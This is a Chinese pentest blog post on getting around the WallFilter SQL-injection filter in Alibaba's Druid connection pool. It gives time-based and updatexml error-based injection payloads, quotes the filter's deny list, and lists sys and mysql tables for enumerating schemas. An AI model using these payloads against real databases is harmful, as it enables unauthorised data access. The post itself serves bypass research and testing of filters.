@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><!-- hexo injector head_begin start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" crossorigin="anonymous"><!-- hexo injector head_begin end -->
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="简介 之前挖洞的时候遇到了一个 SQL 注入，测试时可以看到回显的 SQL 语句，但是一直被拦截，搜索了下发现是 WallFilter  WallFilter是阿里巴巴的数据库连接池Druid中一个特殊的 Filter，主要功能是用于监控SQL安全，并基于SQL语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。 拦截1首次尝试注入，Payload 如下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Druid WallFilter 绕过浅析">
+<meta property="og:url" content="https://www.m1r0ku.com/posts/Druid-WallFilter.html">
+<meta property="og:site_name" content="M1r0ku">
+<meta property="og:description" content="简介 之前挖洞的时候遇到了一个 SQL 注入，测试时可以看到回显的 SQL 语句，但是一直被拦截，搜索了下发现是 WallFilter  WallFilter是阿里巴巴的数据库连接池Druid中一个特殊的 Filter，主要功能是用于监控SQL安全，并基于SQL语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。 拦截1首次尝试注入，Payload 如下：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-0.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-1.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-2.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-3.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-4.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-5.png">
+<meta property="article:published_time" content="2023-03-03T10:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-09T07:48:31.474Z">
+<meta property="article:author" content="M1r0ku">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.m1r0ku.com/assets/Druid-WallFilter-0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Druid WallFilter 绕过浅析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="M1r0ku" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+
+  <!-- FancyBox -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" crossorigin="anonymous" />
+  
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/lists/">Lists</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Druid-WallFilter.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&text=Druid WallFilter 绕过浅析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&is_video=false&description=Druid WallFilter 绕过浅析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Druid WallFilter 绕过浅析&body=Check out this article: https://www.m1r0ku.com/posts/Druid-WallFilter.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&name=Druid WallFilter 绕过浅析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Druid-WallFilter.html&t=Druid WallFilter 绕过浅析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA1"><span class="toc-number">2.</span> <span class="toc-text">拦截1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA2"><span class="toc-number">3.</span> <span class="toc-text">拦截2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">其它查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">尝试绕过</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Druid WallFilter 绕过浅析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M1r0ku</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-03T10:00:00.000Z" itemprop="datePublished">2023-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Pentest/">Pentest</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Bypass/" rel="tag">Bypass</a>, <a class="tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>之前挖洞的时候遇到了一个 SQL 注入，测试时可以看到回显的 SQL 语句，但是一直被拦截，搜索了下发现是 WallFilter</p>
+</blockquote>
+<p>WallFilter是阿里巴巴的<a target="_blank" rel="noopener" href="https://github.com/alibaba/druid">数据库连接池Druid</a>中一个特殊的 Filter，主要功能是用于监控SQL安全，并基于SQL语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。</p>
+<h2 id="拦截1"><a href="#拦截1" class="headerlink" title="拦截1"></a>拦截1</h2><p>首次尝试注入，Payload 如下：</p>
+<figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-cwxbsvlf0t4ybf"></i><span>  Sql  </span><div class="collapse show" id="collapse-cwxbsvlf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span>(sleep(<span class="number">5</span>)))a)#</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>抛出异常：<code>sql injection violation, comment not allow</code></p>
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-0.png" data-caption="Druid-WallFilter-0"><img src="/assets/Druid-WallFilter-0.png" alt="Druid-WallFilter-0"></a></p>
+<p>原因是 WallFilter 的默认拦截策略是<strong>不允许 SQL 中带有注释</strong>，而这里的 Payload 明显含有注释，因此被拦截。参考：<a target="_blank" rel="noopener" href="https://github.com/alibaba/druid/wiki/WallFilter-%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99">alibaba&#x2F;druid - WallFilter拦截规则</a></p>
+<h2 id="拦截2"><a href="#拦截2" class="headerlink" title="拦截2"></a>拦截2</h2><p>再次尝试注入，修改后的 Payload 如下：</p>
+<figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-kfidxslf0t4ybf"></i><span>  Sql  </span><div class="collapse show" id="collapse-kfidxslf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>这次的报错为：<code>sql injection violation, syntax error</code></p>
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-1.png" data-caption="Druid-WallFilter-1"><img src="/assets/Druid-WallFilter-1.png" alt="Druid-WallFilter-1"></a></p>
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-2.png" data-caption="Druid-WallFilter-2"><img src="/assets/Druid-WallFilter-2.png" alt="Druid-WallFilter-2"></a></p>
+<p>原因是默认配置下，WallFilter 拦截了如下函数和关键字：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lGalf63VXCva2I5BpmSMgQ">Druid拦截功能的配置与简单绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/druid/tree/master/src/main/resources/META-INF/druid/wall">alibaba&#x2F;druid&#x2F;wall</a></li>
+</ul>
+<figure class="highlight basic"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-f23rqhlf0t4ybf"></i><span>  Basic  </span><div class="collapse show" id="collapse-f23rqhlf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">deny-function:</span><br><span class="line">  version</span><br><span class="line">  load_file</span><br><span class="line">  database</span><br><span class="line">  schema</span><br><span class="line">  user</span><br><span class="line">  system_user</span><br><span class="line">  session_user</span><br><span class="line">  benchmark</span><br><span class="line">  current_user</span><br><span class="line">  sleep</span><br><span class="line">  xmltype</span><br><span class="line">  receive_message</span><br><span class="line"></span><br><span class="line">deny-schema:</span><br><span class="line">  information_schema</span><br><span class="line">  mysql</span><br><span class="line">  performance_schema    </span><br><span class="line"></span><br><span class="line">deny-variant:</span><br><span class="line">  basedir</span><br><span class="line">  version_compile_os</span><br><span class="line">  version</span><br><span class="line">  datadir</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<h2 id="其它查询"><a href="#其它查询" class="headerlink" title="其它查询"></a>其它查询</h2><p>尝试查询其它的变量</p>
+<figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-1u9e1qlf0t4ybf"></i><span>  Sql  </span><div class="collapse show" id="collapse-1u9e1qlf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES;               # 查看全局变量</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;%xxx%&#x27;</span>;  # 模糊查询全局变量</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.变量名;               # 查看指定全局变量的值</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;                      # 查看用户变量</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;%xxx%&#x27;</span>;         # 模糊查询用户变量</span><br><span class="line"><span class="keyword">SELECT</span> @@变量名;                      # 查看指定用户变量的值</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>这里查几个变量，发现可以成功查询，Payload如下：</p>
+<figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-8z35qilf0t4ybf"></i><span>  Sql  </span><div class="collapse show" id="collapse-8z35qilf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">current_user</span>)),<span class="number">0</span>))</span><br><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@plugin</span>_dir)),<span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-3.png" data-caption="Druid-WallFilter-3"><img src="/assets/Druid-WallFilter-3.png" alt="Druid-WallFilter-3"></a></p>
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-4.png" data-caption="Druid-WallFilter-4"><img src="/assets/Druid-WallFilter-4.png" alt="Druid-WallFilter-4"></a></p>
+<h2 id="尝试绕过"><a href="#尝试绕过" class="headerlink" title="尝试绕过"></a>尝试绕过</h2><p>前面得知禁用了<code>information_schema</code>，这里利用<code>MySQL5.6+</code>的<code>sys</code>系统库中的某些表来尝试绕过。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/soldi_er/article/details/116901009">SQL注入-查表查列</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/plant1234/article/details/118033711">Bugku sql注入 基于布尔的SQL盲注</a></li>
+</ul>
+<figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-pmdyl1lf0t4ybf"></i><span>  Sql  </span><div class="collapse show" id="collapse-pmdyl1lf0t4ybf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use sys</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line"># 默认sys库中，保存库名和表名的信息的表</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.schema_index_statistics</span><br><span class="line">sys.schema_table_statistics</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.x$schema_index_statistics</span><br><span class="line">sys.x$schema_table_statistics</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line"># 示例查询,其中table_schema为库名, table_name为表名</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"># 其它目前可记录的表</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.version;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> object_schema <span class="keyword">from</span> sys.innodb_buffer_stats_by_schema;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> object_schema, object_name <span class="keyword">from</span> sys.innodb_buffer_stats_by_table;</span><br><span class="line"></span><br><span class="line"># MySQL默认存储引擎innoDB携带的表, 两表均有database_name和table_name字段</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>测试之后发现报错：<code>SELECT command denied ...</code>，原因是<strong>当前用户权限不足</strong>所导致。如果数据库当前用户为<code>root</code>或者其它具有对应权限的用户时，利用这个办法进行绕过是可行的</p>
+<p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-5.png" data-caption="Druid-WallFilter-5"><img src="/assets/Druid-WallFilter-5.png" alt="Druid-WallFilter-5"></a></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/lists/">Lists</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA1"><span class="toc-number">2.</span> <span class="toc-text">拦截1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA2"><span class="toc-number">3.</span> <span class="toc-text">拦截2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">其它查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">尝试绕过</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Druid-WallFilter.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&text=Druid WallFilter 绕过浅析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&is_video=false&description=Druid WallFilter 绕过浅析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Druid WallFilter 绕过浅析&body=Check out this article: https://www.m1r0ku.com/posts/Druid-WallFilter.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&title=Druid WallFilter 绕过浅析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Druid-WallFilter.html&name=Druid WallFilter 绕过浅析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Druid-WallFilter.html&t=Druid WallFilter 绕过浅析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2023
+    M1r0ku
+  </div>
+  <div class="footer-right">
+    <nav>
+    <!--
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+       
+          <li><a href="/lists/">Lists</a></li>
+       
+          <li><a href="/links/">Links</a></li>
+       
+          <li><a href="/search/">Search</a></li>
+       
+      </ul>
+    -->
+      
+      <!-- 不蒜子统计 -->
+        <ul>
+          
+          <span id="busuanzi_container_site_pv">
+            <i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span>
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+            <i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span> 
+          </span>
+          <script async src="//cdn.bootcdn.net/ajax/libs/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+          
+      </ul>
+      
+    </nav>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?864b0988af87a8a8f5f115cd29c265de";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'M1r0ku/m1r0ku.github.io';
+      var utterances_issue_term = 'title';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+<!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script><link rel="stylesheet" href="/css/customize.css"><!-- hexo injector body_end end --></body>
+</html>
